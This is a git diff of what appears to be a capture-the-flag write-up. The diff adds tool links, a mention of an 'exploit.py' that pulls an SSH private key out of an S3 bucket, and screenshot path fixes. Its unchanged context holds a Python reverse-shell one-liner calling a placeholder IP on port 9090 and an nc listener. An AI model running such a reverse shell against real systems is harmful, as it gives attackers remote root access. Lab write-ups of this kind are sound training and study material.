@@ -8,11 +8,11 @@
 - Nmap
 - python
 - ssh
-- AWS
+- [AWS](https://docs.aws.amazon.com/cli/latest/reference/s3/)
 - BurpSuite
 - John
-- ssh2john 
-- Cewl
+- ssh2john
+- [Cewl](https://github.com/digininja/CeWL)
 ---
 ## Attack Path
 
@@ -103,6 +103,9 @@ Inside the `internal` bucket, I discovered SSH-related files, including a privat
 2026-05-18 19:32:38         82 authorized_keys
 2026-05-18 19:32:38        464 id_ed25519
 ```
+The 'exploit.py' script replicates all the above steps and downloads the SSH key.
+
+![exploit](screenshots/exploit.png)
 
 ## Cracking SSH Key 
 
@@ -187,7 +190,7 @@ After confirming code execution as root, I modified the payload to establish a r
 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("IP",9090));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
 ```
 
-![python_revshell](/screenshots/python_revshell.png)
+![python_revshell](screenshots/python_revshell.png)
 
 and opened a listener on my attacker machine.
 
@@ -195,4 +198,5 @@ and opened a listener on my attacker machine.
 ➜  Facts nc -lknvp 9090
 ```
 
-![root_shell](/screenshots/root_shell.png)
+![root_shell](screenshots/root_shell.png)
+
